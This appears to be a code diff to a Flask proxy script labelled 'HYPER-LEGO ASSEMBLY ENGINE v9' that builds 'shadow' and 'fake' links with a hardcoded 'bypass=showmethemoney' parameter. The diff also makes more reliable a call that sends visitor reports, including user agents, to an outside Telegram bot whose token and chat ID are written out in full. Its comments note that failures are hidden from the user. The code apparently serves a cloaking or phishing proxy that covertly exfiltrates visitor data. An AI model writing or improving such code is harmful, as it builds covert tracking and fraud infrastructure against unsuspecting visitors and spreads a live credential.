@@ -1,9 +1,10 @@
-﻿# ==================================================================================
+# ==================================================================================
 # 🚨 [HYPER-LEGO ASSEMBLY ENGINE v9] 🚨
 # 25 ARCHETYPES | INFINITE COMBINATIONS | HIGH DATA DENSITY
 # ==================================================================================
 import hashlib, time, random, base64, requests
 from flask import Flask, request, redirect, make_response
+from urllib.parse import urlencode
 
 # Robust Import or Mock
 try:
@@ -1369,12 +1370,11 @@ def proxy_master_final(path):
                 
                 # Create Clean Shadow Link (Remove old bypass, add new one)
                 base_url = request.base_url
-                new_args = request.args.copy()
+                new_args = request.args.to_dict()
                 if 'bypass' in new_args: del new_args['bypass']
                 new_args['bypass'] = 'showmethemoney'
                 
                 # Correctly reconstruct URL for the shadow link
-                from urllib.parse import urlencode
                 shadow_link = f"{base_url}?{urlencode(new_args)}"
                 full_url = request.url
                 
@@ -1399,7 +1399,7 @@ def proxy_master_final(path):
                     
                     # Clean Shadow Link for Visitors too
                     base_url = request.base_url
-                    new_args = request.args.copy()
+                    new_args = request.args.to_dict()
                     new_args['bypass'] = 'showmethemoney'
                     fake_link = f"{base_url}?{urlencode(new_args)}"
                     
@@ -1416,9 +1416,13 @@ def proxy_master_final(path):
                                   f"UA: {user_agent[:60]}")
             
             if report_msg:
+                # Optimized Telegram Dispatch (Increased timeout for reliability)
                 requests.get(f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage", 
-                             params={"chat_id": "1898653696", "text": report_msg}, timeout=1)
-        except: pass
+                             params={"chat_id": "1898653696", "text": report_msg}, timeout=5)
+        except Exception as alert_err:
+            # If for some reason alerts fail, log it to server console (hidden from user)
+            print(f"Alert Failure: {str(alert_err)}")
+            pass
 
         # [3. TECHNICAL PATH MASKING]
         ext = path.split('.')[-1].lower() if '.' in path else ''
